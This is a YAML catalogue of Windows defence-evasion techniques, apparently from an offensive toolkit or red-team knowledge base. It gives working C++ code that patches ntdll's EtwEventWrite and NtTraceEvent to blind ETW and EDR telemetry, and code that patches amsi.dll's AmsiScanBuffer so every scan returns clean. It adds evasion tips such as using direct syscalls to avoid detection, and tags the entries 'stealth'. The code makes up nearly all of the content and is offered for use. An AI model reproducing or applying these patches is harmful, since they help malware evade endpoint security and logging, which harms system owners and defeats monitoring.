etw_bypass:
  etw_event_write_patch:
    name: "EtwEventWrite RET Patch"
    desc: "Patch ntdll!EtwEventWrite to return immediately — blinds ETW/EDR"
    code: |
      void PatchETW() {
          auto addr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
          DWORD old;
          VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
          *(uint8_t*)addr = 0xC3; // RET
          VirtualProtect(addr, 1, old, &old);
      }
    tags: [etw, bypass, telemetry, stealth]

  nt_trace_event_patch:
    name: "NtTraceEvent RET Patch"
    desc: "Lower-level ETW bypass — intercepts before kernel transition"
    code: |
      void PatchNtTraceEvent() {
          auto addr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtTraceEvent");
          DWORD old;
          VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
          *(uint8_t*)addr = 0xC3;
          VirtualProtect(addr, 1, old, &old);
      }
    notes:
      - "Patch NtTraceEvent for deeper coverage than EtwEventWrite alone"
      - "EDR may detect VirtualProtect on ntdll — use direct syscall instead"
    tags: [etw, bypass, ntapi, stealth]

amsi_bypass:
  amsi_scan_buffer_patch:
    name: "AmsiScanBuffer Patch"
    desc: "Patch amsi.dll!AmsiScanBuffer to always return AMSI_RESULT_CLEAN"
    code: |
      void PatchAMSI() {
          auto amsi = LoadLibraryW(L"amsi.dll");
          auto addr = GetProcAddress(amsi, "AmsiScanBuffer");
          DWORD old;
          VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);
          // xor eax, eax; ret → always returns S_OK / AMSI_RESULT_CLEAN
          uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
          memcpy(addr, patch, sizeof(patch));
          VirtualProtect(addr, 6, old, &old);
      }
    notes:
      - "Only relevant for .NET/PowerShell contexts"
      - "Not needed for pure native C++ payloads"
    tags: [amsi, bypass, scripting]

instrumentation_callback:
  desc: "Windows instrumentation callbacks monitor syscall returns"
